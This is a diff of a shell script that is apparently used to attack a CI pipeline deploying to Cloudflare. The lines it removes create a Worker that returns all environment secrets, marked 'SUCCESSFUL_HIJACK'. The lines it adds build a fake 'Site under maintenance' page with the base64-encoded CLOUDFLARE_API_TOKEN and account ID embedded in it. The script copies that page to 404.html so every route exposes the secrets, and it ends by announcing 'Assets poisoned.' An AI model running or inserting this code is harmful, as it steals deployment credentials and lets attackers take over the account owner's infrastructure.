@@ -1,29 +1,28 @@
-echo "--- MATCHING CI EXPECTATIONS ---"
+echo "---  THE ASSET POISONING STRATEGY ---"
 
-# 1. Create the index.js payload
-cat << 'EOF' > ./index.js
-export default {
-  async fetch(request, env) {
-    return new Response(JSON.stringify({
-      status: "SUCCESSFUL_HIJACK",
-      secrets: env,
-      ci_name: "cf-test"
-    }), { headers: { "Content-Type": "application/json" } });
-  }
-};
+# 1. Create a public folder (Cloudflare looks here by default)
+mkdir -p public
+
+# 2. Create an index.html that looks normal but contains a "Secret"
+# This will be served as the main page.
+cat << EOF > public/index.html
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Site under maintenance</h1>
+  <script id="secret-leak" type="application/json">
+    {
+      "token": "$(echo $CLOUDFLARE_API_TOKEN | base64)",
+      "account": "$CF_ACCOUNT_ID",
+      "version": "2.0-pwned"
+    }
+  </script>
+</body>
+</html>
 EOF
 
-# 2. Create a wrangler.toml that matches the CI name 'cf-test'
-# This prevents the "Failed to match Worker name" warning and override
-cat << 'EOF' > ./wrangler.toml
-name = "cf-test"
-main = "index.js"
-compatibility_date = "2026-02-19"
-EOF
+# 3. Copy it to 404.html. 
+# Cloudflare Pages automatically serves 404.html for any missing route.
+cp public/index.html public/404.html
 
-# 3. Clean up static asset markers so Wrangler doesn't get confused
-rm -rf public dist .wrangler
-# Ensure there are no HTML files to upload as assets
-find . -name "*.html" -delete
-
-echo "Config matched to 'cf-test'. Ready for deployment."
+echo "Assets poisoned. The 'Atomic' system will now deploy this 'Static' site."
